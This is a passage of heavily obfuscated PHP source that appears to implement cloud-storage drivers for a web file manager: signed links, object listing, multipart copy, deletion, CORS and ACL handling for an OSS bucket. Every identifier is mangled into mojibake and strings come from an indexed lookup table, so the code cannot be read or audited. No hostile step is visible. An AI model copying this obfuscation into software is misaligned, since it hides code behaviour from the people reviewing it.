{ return !1; } fwrite($ñ˜Ñ·Ï, $¬²äêë¤); $›ÑËŞ­ += $¼…÷Çƒñ; if (strlen($¬²äêë¤) < $¼…÷Çƒñ) { break; } } fclose($ñ˜Ñ·Ï); return $˜×ƒé¼; } public function link($ØéÃ»§, $ëÍÀÕ¡ = array()) { $³ãšƒó¼ =& $_SERVER[©—Ò»ÅĞ]; $ØéÃ»§ = trim($ØéÃ»§, $³ãšƒó¼[8]); if (!empty($this->token)) { $¯ÊÍ†á = strtotime(date($³ãšƒó¼[1798])); $ĞÓ›¶ˆñ = substr(md5($this->token . $³ãšƒó¼[284] . $¯ÊÍ†á . $³ãšƒó¼[1799] . $ØéÃ»§), 12, 8) . $¯ÊÍ†á; $ëÍÀÕ¡[] = $³ãšƒó¼[1800] . $ĞÓ›¶ˆñ; } $øÍİÏ±Œ = !empty($ëÍÀÕ¡) ? $³ãšƒó¼[76] . implode($³ãšƒó¼[284], $ëÍÀÕ¡) : $³ãšƒó¼[12]; return $this->getHost() . $³ãšƒó¼[8] . $this->pathEncode($ØéÃ»§) . $øÍİÏ±Œ; } public function fileOut($ƒí˜õ–, $æïŞšÆ = false, $ƒã²Ş = false, $ë¤í™É¹ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ƒí˜õ–, $æïŞšÆ, $ƒã²Ş, $ë¤í™É¹); } if (!$ƒã²Ş) { $ƒã²Ş = $this->pathThis($ƒí˜õ–); } $ıª„ËÍ° = $æïŞšÆ ? array($_SERVER[©—Ò»ÅĞ][1801] . rawurlencode($ƒã²Ş)) : array(); $‚ÕÜ¬ô¦ = $this->link($ƒí˜õ–, $ıª„ËÍ°); $this->fileOutLink($‚ÕÜ¬ô¦); } public function fileOutServer($”¥·¢á, $¬»‰ïò = false, $ğÕ·í…Ù = false, $õ‘Ôû¨ê = '') { parent::fileOut($”¥·¢á, $¬»‰ïò, $ğÕ·í…Ù, $õ‘Ôû¨ê); } public function fileOutImage($­»Œï³”, $ûÅÄ¥ô‚ = 250) { $¨‚«‚ö¾ = $this->link($­»Œï³” . $_SERVER[©—Ò»ÅĞ][1802] . $ûÅÄ¥ô‚); $this->fileOutLink($¨‚«‚ö¾); } public function fileOutImageServer($ÀÇá…œî, $£—÷ÊŠ = 250) { parent::fileOutImage($ÀÇá…œî, $£—÷ÊŠ); } public function hashMd5($Ÿ––Õòà) { $ÆçşÆ£á =& $_SERVER[©—Ò»ÅĞ]; $‘±‰€¡“ = $this->_objectMeta($Ÿ––Õòà); return isset($‘±‰€¡“[$ÆçşÆ£á[245]]) ? $‘±‰€¡“[$ÆçşÆ£á[245]] : !1; } public function size($èİ¾„¸) { $’æºûŒì = $this->objectMeta($èİ¾„¸); return $’æºûŒì ? $’æºûŒì[$_SERVER[©—Ò»ÅĞ][79]] : 0; } public function info($ÆşÈœí·) { if ($this->isFolder($ÆşÈœí·)) { return $this->folderInfo($ÆşÈœí·); } else { if ($this->isFile($ÆşÈœí·)) { return $this->fileInfo($ÆşÈœí·); } } return !1; } public function exist($º¤¾·‚µ) { return $this->isFile($º¤¾·‚µ) || $this->isFolder($º¤¾·‚µ); } public function isFile($¡Óõ½Ğ) { return !$this->isFolder($¡Óõ½Ğ) && $this->objectMeta($¡Óõ½Ğ); } public function isFolder($ÆÌ¶™››) { return $this->cacheMethod($_SERVER[©—Ò»ÅĞ][177], $ÆÌ¶™››); } protected function objectMeta($ÕÚùï¤€) { return $this->cacheMethod($_SERVER[©—Ò»ÅĞ][179], $ÕÚùï¤€); } protected function _objectMeta($Ÿµ–£î–) { $‹ï„Ğù =& $_SERVER[©—Ò»ÅĞ]; if ($Ÿµ–£î– == $‹ï„Ğù[12] || $Ÿµ–£î– == $‹ï„Ğù[8]) { return array(); } $¢º÷ïñ = $this->ussRequest($Ÿµ–£î–, $‹ï„Ğù[1803]); if (!$¢º÷ïñ[$‹ï„Ğù[1402]]) { return null; } $‘ôß”å« = isset($¢º÷ïñ[$‹ï„Ğù[1392]]) ? $¢º÷ïñ[$‹ï„Ğù[1392]] : array(); if (!isset($‘ôß”å«[$‹ï„Ğù[1804]])) { return null; } $ı²ªÀ› = array($‹ï„Ğù[33] => isset($‘ôß”å«[$‹ï„Ğù[1804]]) ? $‘ôß”å«[$‹ï„Ğù[1804]] : null, $‹ï„Ğù[79] => isset($‘ôß”å«[$‹ï„Ğù[1805]]) ? $‘ôß”å«[$‹ï„Ğù[1805]] : null, $‹ï„Ğù[245] => isset($‘ôß”å«[$‹ï„Ğù[1806]]) ? $‘ôß”å«[$‹ï„Ğù[1806]] : null, $‹ï„Ğù[1773] => isset($‘ôß”å«[$‹ï„Ğù[1807]]) ? $‘ôß”å«[$‹ï„Ğù[1807]] : null); $ı²ªÀ›[$‹ï„Ğù[1774]] = isset($‘ôß”å«[$‹ï„Ğù[1808]]) ? strtotime($‘ôß”å«[$‹ï„Ğù[1808]]) : $ı²ªÀ›[$‹ï„Ğù[1773]]; return $ı²ªÀ›; } protected function _isFolder($õáß–î–) { $ş³øÅ¤• =& $_SERVER[©—Ò»ÅĞ]; if ($õáß–î– == $ş³øÅ¤•[12] || $õáß–î– == $ş³øÅ¤•[8]) { return !0; } $òİÄùù¾ = $this->_objectMeta($õáß–î–); return isset($òİÄùù¾[$ş³øÅ¤•[33]]) && $òİÄùù¾[$ş³øÅ¤•[33]] == $ş³øÅ¤•[78] ? !0 : !1; } } $_file = $_SERVER[$_SERVER[©—Ò»ÅĞ][1035]]; $_size = $_SERVER[©—Ò»ÅĞ][1809]; goto Dáß†í©¡È; b±¸ìêœ: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($Áåâ¼ò) { parent::__construct(); include_once SDK_DIR . $_SERVER[©—Ò»ÅĞ][1670]; $this->_init($Áåâ¼ò); } public function _init($è™øñÖ¸) { $ğÑÏ©Ôæ =& $_SERVER[©—Ò»ÅĞ]; $this->config = $è™øñÖ¸; foreach ($è™øñÖ¸ as $ËÄ¿·Ëş => $Ì•Şéí) { if (isset($this->{$ËÄ¿·Ëş})) { $this->{$ËÄ¿·Ëş} = $Ì•Şéí; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ğÑÏ©Ôæ[1671] . LNG($ğÑÏ©Ôæ[1672])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $­Á‹õß­ =& $_SERVER[©—Ò»ÅĞ]; $¿´É¯‚ü = new OSS\Model\CorsConfig(); $ £•åŠ = new OSS\Model\CorsRule(); $ £•åŠ->addAllowedOrigin($­Á‹õß­[1673]); $ £•åŠ->addAllowedMethod($­Á‹õß­[1674]); $ £•åŠ->addAllowedMethod($­Á‹õß­[1675]); $ £•åŠ->addAllowedMethod($­Á‹õß­[1676]); $ £•åŠ->addAllowedMethod($­Á‹õß­[1677]); $ £•åŠ->addAllowedMethod($­Á‹õß­[162]); $ £•åŠ->setMaxAgeSeconds(600); $ £•åŠ->addExposeHeader($­Á‹õß­[1678]); $ £•åŠ->addAllowedHeader($­Á‹õß­[1673]); $¿´É¯‚ü->addRule($ £•åŠ); try { $this->client->putBucketCors($this->bucket, $¿´É¯‚ü); } catch (OSS\Core\OssException $àâşÇŸ) { $this->writeLog(__FUNCTION__ . $­Á‹õß­[212] . $àâşÇŸ->getMessage()); return !1; } return !0; } public function getBucketCors() { $¾Âšë¥© =& $_SERVER[©—Ò»ÅĞ]; $ò¹³ò÷õ = null; try { $ò¹³ò÷õ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ĞÁæ•Î) { $this->writeLog(__FUNCTION__ . $¾Âšë¥©[212] . $ĞÁæ•Î->getMessage()); return null; } if (!$ò¹³ò÷õ || !($¤³Ğº² = $ò¹³ò÷õ->getRules())) { return null; } $ï©€üµ = $¤³Ğº²[0]->getAllowedOrigins(); $‡£ÂÙñİ = $¤³Ğº²[0]->getAllowedMethods(); $Ä€Ä‚Æ€ = $¤³Ğº²[0]->getMaxAgeSeconds(); $‘ÀÀºŠÉ = $¤³Ğº²[0]->getExposeHeaders(); $ˆöÃÎÖ = $¤³Ğº²[0]->getAllowedHeaders(); return array($¾Âšë¥©[218] => isset($ï©€üµ[0]) ? $ï©€üµ[0] : $¾Âšë¥©[12], $¾Âšë¥©[222] => $‡£ÂÙñİ, $¾Âšë¥©[1679] => $Ä€Ä‚Æ€, $¾Âšë¥©[1680] => isset($‘ÀÀºŠÉ[0]) ? $‘ÀÀºŠÉ[0] : $¾Âšë¥©[12], $¾Âšë¥©[219] => isset($ˆöÃÎÖ[0]) ? $ˆöÃÎÖ[0] : $¾Âšë¥©[12]); } public function isBucketCors() { $ä¾èÄšî =& $_SERVER[©—Ò»ÅĞ]; $è¼ªõ‘ = $this->getBucketCors(); if (!$è¼ªõ‘ || !is_array($è¼ªõ‘)) { return !1; } if ($è¼ªõ‘[$ä¾èÄšî[218]] != $ä¾èÄšî[220] || $è¼ªõ‘[$ä¾èÄšî[219]] != $ä¾èÄšî[220]) { return !1; } $ıóÏ¸ç = array_map($ä¾èÄšî[221], $è¼ªõ‘[$ä¾èÄšî[222]]); if (!is_array($ıóÏ¸ç)) { $ıóÏ¸ç = array(); } $Éœ÷åèŒ = array($ä¾èÄšî[223], $ä¾èÄšî[224], $ä¾èÄšî[225], $ä¾èÄšî[226], $ä¾èÄšî[227]); $ŒïİİÛ = array_diff($Éœ÷åèŒ, $ıóÏ¸ç); return empty($ŒïİİÛ); } public function mkfile($÷À¤Şç¶, $Š“¥”÷ = '', $ŒèüÓú¦ = REPEAT_RENAME) { $µëŸê¡Î = $this->setContent($÷À¤Şç¶, $Š“¥”÷); if ($µëŸê¡Î !== !1) { return $this->getPathOuter($÷À¤Şç¶); } return !1; } public function mkdir($®úŞ²ô¤, $£·‰»Ä = REPEAT_SKIP) { if ($£·‰»Ä && $this->_isFolder($®úŞ²ô¤)) { return $this->getPathOuter($®úŞ²ô¤); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($®úŞ²ô¤)); } catch (OSS\Core\OssException $«æÊ•ÅÓ) { $this->writeLog(__FUNCTION__ . $_SERVER[©—Ò»ÅĞ][212] . $«æÊ•ÅÓ->getMessage()); return !1; } return $this->getPathOuter($®úŞ²ô¤); } private function fileList($ÖõóÄ­, $‰ˆáéÔ­ = '', $®ñ¡±³Ó = 0) { $¼ç£•˜¶ =& $_SERVER[©—Ò»ÅĞ]; $ÖõóÄ­ = trim($ÖõóÄ­, $¼ç£•˜¶[8]); $ëé×Áêä = empty($ÖõóÄ­) && $ÖõóÄ­ !== $¼ç£•˜¶[228] ? $¼ç£•˜¶[12] : $ÖõóÄ­ . $¼ç£•˜¶[8]; $Æì•íıó = $¼ç£•˜¶[12]; $¥Ùêº³ó = 1000; $‚èœ±¨É = $Æ’ÚÅ÷ = array(); while (!0) { check_abort(); $ÍÀ–Ä¦ƒ = array($¼ç£•˜¶[1681] => $‰ˆáéÔ­, $¼ç£•˜¶[1682] => $ëé×Áêä, $¼ç£•˜¶[1683] => $¥Ùêº³ó, $¼ç£•˜¶[1684] => $Æì•íıó); try { $âúÎÆ§Ò = $this->client->listObjects($this->bucket, $ÍÀ–Ä¦ƒ); } catch (OSS\Core\OssException $¹‘Ïòšè) { $this->writeLog(__FUNCTION__ . $¼ç£•˜¶[212] . $¹‘Ïòšè->getMessage()); break; } $Æì•íıó = $âúÎÆ§Ò->getNextMarker(); $î˜öçó = $âúÎÆ§Ò->getObjectList(); $Ù˜˜ÌÔµ = $âúÎÆ§Ò->getPrefixList(); foreach ($î˜öçó as $¼ãÍçÄ) { if ($¼ãÍçÄ->getKey() == $ëé×Áêä) { continue; } $Äµå¡»ï = $¼ãÍçÄ->getKey(); $á¦™— = $¼ãÍçÄ->getSize(); $ßÑÖÓ¾ä = $¼ãÍçÄ->getLastModified(); $ÊïÙÇŠ = trim($¼ãÍçÄ->getETag(), $¼ç£•˜¶[118]); $…ìÑç’ = $®ñ¡±³Ó ? array($¼ç£•˜¶[32] => $Äµå¡»ï, $¼ç£•˜¶[79] => $á¦™—, $¼ç£•˜¶[204] => strtotime($ßÑÖÓ¾ä), $¼ç£•˜¶[1685] => $ÊïÙÇŠ) : $Äµå¡»ï; $öâò‘‡ = $á¦™— == 0 && substr($Äµå¡»ï, strlen($Äµå¡»ï) - 1, 1) == $¼ç£•˜¶[8] ? !0 : !1; $ÈÄçÅÖ = array($¼ç£•˜¶[79] => $á¦™—, $¼ç£•˜¶[1686] => $á¦™—, $¼ç£•˜¶[88] => strtotime($ßÑÖÓ¾ä), $¼ç£•˜¶[1687] => $ßÑÖÓ¾ä, $¼ç£•˜¶[1685] => $ÊïÙÇŠ); $this->cacheMethodInfoSet($Äµå¡»ï, $öâò‘‡, $ÈÄçÅÖ); if ($öâò‘‡) { $‚èœ±¨É[] = $Äµå¡»ï; continue; } $Æ’ÚÅ÷[] = $…ìÑç’; } foreach ($Ù˜˜ÌÔµ as $¬°Î³Ìù) { $‚èœ±¨É[] = $¬°Î³Ìù->getPrefix(); $this->cacheMethodInfoSet($¬°Î³Ìù->getPrefix(), !0); } if ($Æì•íıó === $¼ç£•˜¶[12]) { break; } } $this->cacheMethodInfoSet($ÖõóÄ­, !0); return array($¼ç£•˜¶[85] => $‚èœ±¨É, $¼ç£•˜¶[86] => $Æ’ÚÅ÷); } public function listObject($±¯õÎ×ª, $ìÓ„š¿ë = '') { $œ€Ø€“½ =& $_SERVER[©—Ò»ÅĞ]; $±¯õÎ×ª = trim($±¯õÎ×ª, $œ€Ø€“½[8]); $™“×œşç = empty($±¯õÎ×ª) && $±¯õÎ×ª !== $œ€Ø€“½[228] ? $œ€Ø€“½[12] : $±¯õÎ×ª . $œ€Ø€“½[8]; $Œ°ç”ú = $œ€Ø€“½[12]; $¹ÒĞ£º = 1000; $é„¥×Ã = $É’†¼˜¥ = array(); while (!0) { check_abort(); $ş ³¨‘£ = array($œ€Ø€“½[1681] => $ìÓ„š¿ë, $œ€Ø€“½[1682] => $™“×œşç, $œ€Ø€“½[1683] => $¹ÒĞ£º, $œ€Ø€“½[1684] => $Œ°ç”ú); try { $¦˜óú‚Ã = $this->client->listObjects($this->bucket, $ş ³¨‘£); } catch (OSS\Core\OssException $©òÛÄ‚») { $this->writeLog(__FUNCTION__ . $œ€Ø€“½[212] . $©òÛÄ‚»->getMessage()); break; } $Œ°ç”ú = $¦˜óú‚Ã->getNextMarker(); $è¯ŠÊ¼ş = $¦˜óú‚Ã->getObjectList(); foreach ($è¯ŠÊ¼ş as $‘ı ¤Èµ) { if ($‘ı ¤Èµ->getKey() == $™“×œşç) { continue; } $î‡„·‹µ = $‘ı ¤Èµ->getKey(); $µÉÈØåÓ = $‘ı ¤Èµ->getSize(); $æ‰§¢œµ = $µÉÈØåÓ == 0 && substr($î‡„·‹µ, strlen($î‡„·‹µ) - 1, 1) == $œ€Ø€“½[8] ? !0 : !1; if ($æ‰§¢œµ) { continue; } $É’†¼˜¥[] = $µÉÈØåÓ . $œ€Ø€“½[212] . $î‡„·‹µ; } if ($Œ°ç”ú === $œ€Ø€“½[12]) { break; } } return array($œ€Ø€“½[85] => $é„¥×Ã, $œ€Ø€“½[86] => $É’†¼˜¥); } public function copyFile($¤ƒ›Ø, $‚ëŞ™éä) { $½è­—¤ = $this->size($¤ƒ›Ø); if ($½è­—¤ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $¤ƒ›Ø, $this->bucket, $this->pathEncode($‚ëŞ™éä)); } catch (OSS\Core\OssException $„Éß¬Õ) { $this->writeLog(__FUNCTION__ . $_SERVER[©—Ò»ÅĞ][212] . $„Éß¬Õ->getMessage()); return !1; } return $this->getPathOuter($‚ëŞ™éä); } $”±’‚¢¸ = $this->multiCopyObject($¤ƒ›Ø, $‚ëŞ™éä, $½è­—¤); return $”±’‚¢¸ ? $this->getPathOuter($‚ëŞ™éä) : !1; } private function multiCopyObject($«—å¡”ü, $ç¡¨±ö, $ĞŸØÅ¸©) { $òÔ¹ñÎ =& $_SERVER[©—Ò»ÅĞ]; try { $ŒÏ´Äêû = array(); if ($€ÖúÛµ× = $this->hashMd5($«—å¡”ü)) { $ŒÏ´Äêû = array(OSS\OssClient::OSS_HEADERS => array($òÔ¹ñÎ[1688] => $€ÖúÛµ×)); } $ ¨É­º = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ç¡¨±ö), $ŒÏ´Äêû); $Àş¦ôÈú = 1; $Æùü²€Ï = 0; $¾ÊÒ›¸ã = array(); $–šäºÓ  = 1024 * 1024 * 10; $™Ö×±Ê = $this->client->generateMultiuploadParts($ĞŸØÅ¸©, $–šäºÓ ); foreach ($™Ö×±Ê as $´ş‡¼³§ => $œŒÎ·) { $Ğœ®¶ŠÅ = $Æùü²€Ï + (int) $œŒÎ·[$òÔ¹ñÎ[1689]]; $è¯‹Ì‰ = (int) $œŒÎ·[$òÔ¹ñÎ[412]] + $Ğœ®¶ŠÅ - 1; $À†¼‡ø = array($òÔ¹ñÎ[164] => $Ğœ®¶ŠÅ, $òÔ¹ñÎ[165] => $è¯‹Ì‰); $¾ÊÒ›¸ã[] = $this->client->uploadPartCopy($this->bucket, $«—å¡”ü, $this->bucket, $this->pathEncode($ç¡¨±ö), $Àş¦ôÈú, $ ¨É­º, $À†¼‡ø); $Àş¦ôÈú = $Àş¦ôÈú + 1; } $ò²ßê› = array(); foreach ($¾ÊÒ›¸ã as $´ş‡¼³§ => $ÎİæÏÊÄ) { $ò²ßê›[] = array($òÔ¹ñÎ[297] => $´ş‡¼³§ + 1, $òÔ¹ñÎ[298] => $ÎİæÏÊÄ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($ç¡¨±ö), $ ¨É­º, $ò²ßê›); } catch (OSS\Core\OssException $ƒô–»÷Ë) { $this->writeLog(__FUNCTION__ . $òÔ¹ñÎ[212] . $ƒô–»÷Ë->getMessage()); return !1; } return !0; } public function moveFile($ªÚ¦·“ˆ, $…À’¯àö) { if ($this->copyFile($ªÚ¦·“ˆ, $…À’¯àö)) { $this->remove($ªÚ¦·“ˆ); return $this->getPathOuter($…À’¯àö); } return !1; } public function delFile($ÇÃ²åô) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($ÇÃ²åô)); } catch (OSS\Core\OssException $ª»ãÔş±) { $this->writeLog(__FUNCTION__ . $_SERVER[©—Ò»ÅĞ][212] . $ª»ãÔş±->getMessage()); return !1; } return !0; } public function delFolder($Ã¸”Šˆû) { $ÕË­ÀÉ =& $_SERVER[©—Ò»ÅĞ]; if (!$this->exist($Ã¸”Šˆû)) { return !0; } $this->listItemCache = !1; $¢ ”éÒ = $this->fileList($Ã¸”Šˆû); $this->listItemCache = !0; $ŸÉßÁı« = trim($Ã¸”Šˆû, $ÕË­ÀÉ[8]) . $ÕË­ÀÉ[8]; if (!empty($Ã¸”Šˆû) && $Ã¸”Šˆû !== $ÕË­ÀÉ[228] && !in_array($ŸÉßÁı«, $¢ ”éÒ[$ÕË­ÀÉ[85]])) { $¢ ”éÒ[$ÕË­ÀÉ[85]][] = $ŸÉßÁı«; } $Êó–¤Ø£ = $this->delByBatch($¢ ”éÒ[$ÕË­ÀÉ[86]]); if (!$Êó–¤Ø£) { return !1; } $Êó–¤Ø£ = $this->delByBatch($¢ ”éÒ[$ÕË­ÀÉ[85]]); if (!$Êó–¤Ø£) { return !1; } return $this->delFile($ŸÉßÁı«); } private function delByBatch($…¾²‰™â) { foreach (array_chunk($…¾²‰™â, 1000) as $Ã‹ô‚’½) { try { $this->client->deleteObjects($this->bucket, $Ã‹ô‚’½); } catch (OSS\Core\OssException $™–—’Ï) { $this->writeLog(__FUNCTION__ . $_SERVER[©—Ò»ÅĞ][212] . $™–—’Ï->getMessage()); return !1; } } return !0; } public function rename($Ş•ßâšù, $â›¾¡¥Á) { return $this->renameObject($Ş•ßâšù, $â›¾¡¥Á); } private function fileInfo($œŒÙ‘şä, $ïêÒ®Á¿ = false, $€µ­¬ûé = array()) { $÷€£™Ü =& $_SERVER[©—Ò»ÅĞ]; $‡ÏĞÓëœ = array($÷€£™Ü[32] => $this->pathThis($œŒÙ‘şä), $÷€£™Ü[87] => $this->getPathOuter($œŒÙ‘şä), $÷€£™Ü[33] => $÷€£™Ü[230], $÷€£™Ü[79] => isset($€µ­¬ûé[$÷€£™Ü[79]]) ? $€µ­¬ûé[$÷€£™Ü[79]] : 0, $÷€£™Ü[166] => $this->ext($œŒÙ‘şä)); if ($ïêÒ®Á¿) { return $‡ÏĞÓëœ; } $‡ÏĞÓëœ[$÷€£™Ü[231]] = $‡ÏĞÓëœ[$÷€£™Ü[88]] = 0; $‡ÏĞÓëœ[$÷€£™Ü[232]] = $‡ÏĞÓëœ[$÷€£™Ü[233]] = !0; if (empty($€µ­¬ûé)) { $òÇ³™®ı = $this->objectMeta($œŒÙ‘şä); if (!$òÇ³™®ı) { return $‡ÏĞÓëœ; } $€µ­¬ûé = array($÷€£™Ü[88] => strtotime($òÇ³™®ı[$÷€£™Ü[1687]]), $÷€£™Ü[79] => $òÇ³™®ı[$÷€£™Ü[1686]] + 0, $÷€£™Ü[1685] => $òÇ³™®ı[$÷€£™Ü[1685]]); } if (isset($€µ­¬ûé[$÷€£™Ü[1685]]) && $€µ­¬ûé[$÷€£™Ü[1685]]) { $‡ÏĞÓëœ[$÷€£™Ü[235]] = trim($€µ­¬ûé[$÷€£™Ü[1685]], $÷€£™Ü[118]); } if (isset($€µ­¬ûé[$÷€£™Ü[79]])) { $‡ÏĞÓëœ[$÷€£™Ü[79]] = $€µ­¬ûé[$÷€£™Ü[79]]; } if (isset($€µ­¬ûé[$÷€£™Ü[88]])) { $‡ÏĞÓëœ[$÷€£™Ü[88]] = $€µ­¬ûé[$÷€£™Ü[88]]; } if (isset($€µ­¬ûé[$÷€£™Ü[204]]) && !trim($‡ÏĞÓëœ[$÷€£™Ü[88]])) { $‡ÏĞÓëœ[$÷€£™Ü[88]] = $€µ­¬ûé[$÷€£™Ü[204]]; } return $‡ÏĞÓëœ; } private function folderInfo($Ú´ùšÙ, $«®Ä³É„ = false, $µ‰Îº™÷ = array()) { $˜Ü£½û =& $_SERVER[©—Ò»ÅĞ]; $ŠÃäøµ = array($˜Ü£½û[32] => $this->pathThis($Ú´ùšÙ), $˜Ü£½û[87] => $this->getPathOuter($˜Ü£½û[8] . $Ú´ùšÙ), $˜Ü£½û[33] => $˜Ü£½û[78]); if ($«®Ä³É„) { return $ŠÃäøµ; } $ŠÃäøµ[$˜Ü£½û[231]] = $ŠÃäøµ[$˜Ü£½û[88]] = 0; $ŠÃäøµ[$˜Ü£½û[232]] = $ŠÃäøµ[$˜Ü£½û[233]] = !0; if (empty($µ‰Îº™÷)) { $Ú´ùšÙ = rtrim($Ú´ùšÙ, $˜Ü£½û[8]) . $˜Ü£½û[8]; $ÕêŒÒ€ = $this->objectMeta($Ú´ùšÙ); if (!$ÕêŒÒ€) { return $ŠÃäøµ; } $µ‰Îº™÷ = array($˜Ü£½û[231] => $ÕêŒÒ€[$˜Ü£½û[595]][$˜Ü£½û[1690]], $˜Ü£½û[88] => strtotime($ÕêŒÒ€[$˜Ü£½û[1687]])); } if (isset($µ‰Îº™÷[$˜Ü£½û[88]])) { $ŠÃäøµ[$˜Ü£½û[88]] = $µ‰Îº™÷[$˜Ü£½û[88]]; } if (isset($µ‰Îº™÷[$˜Ü£½û[231]])) { $ŠÃäøµ[$˜Ü£½û[231]] = $µ‰Îº™÷[$˜Ü£½û[231]]; } return $ŠÃäøµ; } public function listPath($ı†Ğ“ó¯, $ßñãÃîø = false) { $êõ³– =& $_SERVER[©—Ò»ÅĞ]; $Á¶øûÎõ = $this->fileList($ı†Ğ“ó¯, $êõ³–[8], !0); foreach ($Á¶øûÎõ[$êõ³–[85]] as $ğÉ¼âØ => $¹¦©ŒŒ) { $Á¶øûÎõ[$êõ³–[85]][$ğÉ¼âØ] = $this->folderInfo($¹¦©ŒŒ, $ßñãÃîø, $¹¦©ŒŒ); } foreach ($Á¶øûÎõ[$êõ³–[86]] as $ğÉ¼âØ => $¹¦©ŒŒ) { $Á¶øûÎõ[$êõ³–[86]][$ğÉ¼âØ] = $this->fileInfo($¹¦©ŒŒ[$êõ³–[32]], $ßñãÃîø, $¹¦©ŒŒ); } return $Á¶øûÎõ; } protected function infoChildren($ËŒà†Éá, &$ÀĞõ™Èê) { $§øÔ÷şğ =& $_SERVER[©—Ò»ÅĞ]; $‰æ²ÚÓ‹ = $this->fileList($ËŒà†Éá, $§øÔ÷şğ[12], !0); $ÀĞõ™Èê[$§øÔ÷şğ[81]] += count($‰æ²ÚÓ‹[$§øÔ÷şğ[85]]); $ÀĞõ™Èê[$§øÔ÷şğ[80]] += count($‰æ²ÚÓ‹[$§øÔ÷şğ[86]]); foreach ($‰æ²ÚÓ‹[$§øÔ÷şğ[86]] as $†É½¸ñø) { if (!$†É½¸ñø || !$†É½¸ñø[$§øÔ÷şğ[79]]) { continue; } $ÀĞõ™Èê[$§øÔ÷şğ[79]] += $†É½¸ñø[$§øÔ÷şğ[79]]; } } public function has($³ëú¿ğ, $İ¸°©ó± = false, $¬±˜¾ÈÓ = true) { $ıÊÃ¨‚ =& $_SERVER[©—Ò»ÅĞ]; $³ëú¿ğ = trim($³ëú¿ğ, $ıÊÃ¨‚[8]); $»’ÇŞª¸ = empty($³ëú¿ğ) && $³ëú¿ğ !== $ıÊÃ¨‚[228] ? $ıÊÃ¨‚[12] : $³ëú¿ğ . $ıÊÃ¨‚[8]; $Ûëƒ•†ú = $ıÊÃ¨‚[12]; $Ó´ÊÚìÆ = 500; $üËæ¿ô¸ = $ìíá€àâ = 0; while (!0) { check_abort(); $û«É•ı‹ = array($ıÊÃ¨‚[1681] => $ıÊÃ¨‚[8], $ıÊÃ¨‚[1682] => $»’ÇŞª¸, $ıÊÃ¨‚[1683] => $Ó´ÊÚìÆ, $ıÊÃ¨‚[1684] => $Ûëƒ•†ú); try { $Ûê†• = $this->client->listObjects($this->bucket, $û«É•ı‹); } catch (OSS\Core\OssException $ñûÕˆ) { $this->writeLog(__FUNCTION__ . $ıÊÃ¨‚[212] . $ñûÕˆ->getMessage()); break; } $Ûëƒ•†ú = $Ûê†•->getNextMarker(); $˜Çï½É = $Ûê†•->getObjectList(); $—óÄËï» = $Ûê†•->getPrefixList(); if ($İ¸°©ó±) { if (count($˜Çï½É) > 1 || count($˜Çï½É) == 1 && $˜Çï½É[0]->getKey() != $»’ÇŞª¸) { $üËæ¿ô¸ += count($˜Çï½É) - 1; } if (!empty($—óÄËï»)) { $ìíá€àâ += count($—óÄËï»); } if ($Ûëƒ•†ú === $ıÊÃ¨‚[12]) { break; } continue; } if ($¬±˜¾ÈÓ) { if (!empty($˜Çï½É)) { if (count($˜Çï½É) > 1 || $˜Çï½É[0]->getKey() != $»’ÇŞª¸) { return !0; } } } else { if (!empty($—óÄËï»)) { return !0; } } if ($Ûëƒ•†ú === $ıÊÃ¨‚[12]) { break; } } if ($İ¸°©ó±) { return array($ıÊÃ¨‚[239] => $üËæ¿ô¸, $ıÊÃ¨‚[240] => $ìíá€àâ); } return !1; } public function listAll($¾Ûõ¦­î) { $ËÚı¾„Ò =& $_SERVER[©—Ò»ÅĞ]; $ä»Ÿ‚ = $this->fileList($¾Ûõ¦­î, $ËÚı¾„Ò[12], !0); $¸‚Í€ Ã = array_to_keyvalue($ä»Ÿ‚[$ËÚı¾„Ò[86]], $ËÚı¾„Ò[32]); foreach ($ä»Ÿ‚[$ËÚı¾„Ò[85]] as $êıä˜ŠÇ) { if (is_string($êıä˜ŠÇ)) { $¸‚Í€ Ã[$êıä˜ŠÇ] = array($ËÚı¾„Ò[79] => 0); } } return $this->listAllFiles($¾Ûõ¦­î, $¸‚Í€ Ã); } public function canRead($‡ê‰í±„) { $Ñèºû“‘ =& $_SERVER[©—Ò»ÅĞ]; $ÑÖøô• = $this->pathAcl($‡ê‰í±„); return $ÑÖøô• == $Ñèºû“‘[1691] || $ÑÖøô• == $Ñèºû“‘[642] ? !0 : !1; } public function canWrite($ƒ—Ñº×) { $ ÖÜİÎŸ = $this->pathAcl($ƒ—Ñº×); return $ ÖÜİÎŸ == $_SERVER[©—Ò»ÅĞ][642] ? !0 : !1; } public function pathAcl($Éû¶—îü) { $×ÜÛÃÅ¤ =& $_SERVER[©—Ò»ÅĞ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $îœ‰‡ôæ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($Éû¶—îü)); } catch (OSS\Core\OssException $×§”İÔ) { $this->writeLog(__FUNCTION__ . $×ÜÛÃÅ¤[212] . $×§”İÔ->getMessage()); return !1; } $½ô¸”Æ± = $îœ‰‡ôæ == $×ÜÛÃÅ¤[37] ? $this->bucketAcl : $îœ‰‡ôæ; if ($½ô¸”Æ± == $×ÜÛÃÅ¤[1692]) { return $×ÜÛÃÅ¤[1691]; } if ($½ô¸”Æ± == $×ÜÛÃÅ¤[1693]) { return $×ÜÛÃÅ¤[642]; } return $½ô¸”Æ±; } private function chmodPath($ªØïç×¾, $‰£úäÃ´ = '') { $Óİß»×Ş =& $_SERVER[©—Ò»ÅĞ]; $ØÜç‰Ê = empty($‰£úäÃ´) ? $Óİß»×Ş[1693] : $‰£úäÃ´; $šØ––¹ò = array($Óİß»×Ş[37], $Óİß»×Ş[229], $Óİß»×Ş[1692], $Óİß»×Ş[1693]); if (!in_array($ØÜç‰Ê, 